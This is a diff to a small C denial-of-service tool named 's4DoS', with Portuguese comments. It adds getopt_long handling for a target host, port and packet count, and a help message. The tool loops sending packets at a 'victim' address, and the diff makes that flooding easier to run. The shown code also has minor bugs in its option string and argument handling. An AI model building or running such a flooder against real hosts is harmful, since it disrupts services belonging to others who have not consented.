@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <getopt.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <arpa/inet.h>
@@ -17,6 +18,18 @@ void banner(){
     puts("[+]github: github/Lexroot");
 }
 
+void help(){
+    fprintf(stderr,
+            "Use: %s [OPCAO]\n\n"
+            "OPCOES:\n"
+            "-h, --host     Informe o host(alvo)\n"
+            "-p, --port     Informe a porta\n"
+            "-n, --npacket  Informe o numero de pacotes\n");
+    exit(1);
+
+}
+
+//funcao para retornar possiveis erros
 void fatal(char *msg){
     fprintf(stderr, "%s\n", msg);
     exit(1); 
@@ -31,19 +44,52 @@ struct pool{
     char * host;
 };
 
+const char *opts = "h:p:n";
+
+const struct option opts1[] = {
+
+    { "host",    1, 0, 'h' },
+    { "port",    1, 0, 'p' },
+    { "npacket", 1, 0, 'n' },
+    { 0, 0, 0,0 },
+    
+};
+
 int main(int argc, char *argv[]){
     if(argc < 3){
-        banner();
-        printf("\n");
-        fatal("Example: ./s4DoS 1270.0.0.1 80 1000");
+        help(); 
     }
 
+    int c;
     struct sockaddr_in vit;
-    struct pool p; 
+    struct pool p;
+
+
+    while((c = getopt_long(argc, argv, opts, opts1, &optind)) != -1){
     
+        switch(c){
+            case 'h':
+                p.host = optarg;
+                break;
+            
+            case 'p':
+                p.port = atoi(optarg);
+                break;
+
+            case 'n':
+                p.fim = atoi(optarg);
+                break;
+
+            default:
+                help(); 
+        }
+    }
+
+    /* 
     p.host   = argv[1];
     p.port   = atoi(argv[2]);
-    p.fim    = atoi(argv[3]);
+    p.fim  	 = atoi(argv[3]);
+    */
 
     for(p.inicio = 0; p.inicio < p.fim; p.inicio++){ 
 
@@ -61,4 +107,6 @@ int main(int argc, char *argv[]){
             printf("Packet -> %d - Bytes - %zu\n", p.inicio, sizeof(p.inicio));
         }
     }
+
+    return 0;
 }
